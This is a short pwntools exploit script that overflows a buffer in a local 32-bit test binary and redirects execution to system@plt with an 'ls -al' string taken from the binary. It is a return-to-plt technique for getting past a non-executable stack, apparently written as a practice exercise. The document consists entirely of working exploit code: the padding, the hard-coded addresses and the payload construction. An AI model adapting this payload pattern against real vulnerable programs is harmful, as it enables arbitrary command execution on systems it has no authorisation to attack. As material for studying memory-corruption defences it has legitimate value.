from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')

p = process("./test_ennx_plt")

system_plt = 0x8048388
command_addr = p.elf.search('ls -al').next()
saved_eip = 0x607d28

print "system plt : %x, command addr : %x" %(system_plt, command_addr)

p.recvline()
payload = 'A'* 28 +  p32(system_plt) + p32(saved_eip) + p32(command_addr)
p.sendline(payload)
p.recvall()
p.close()


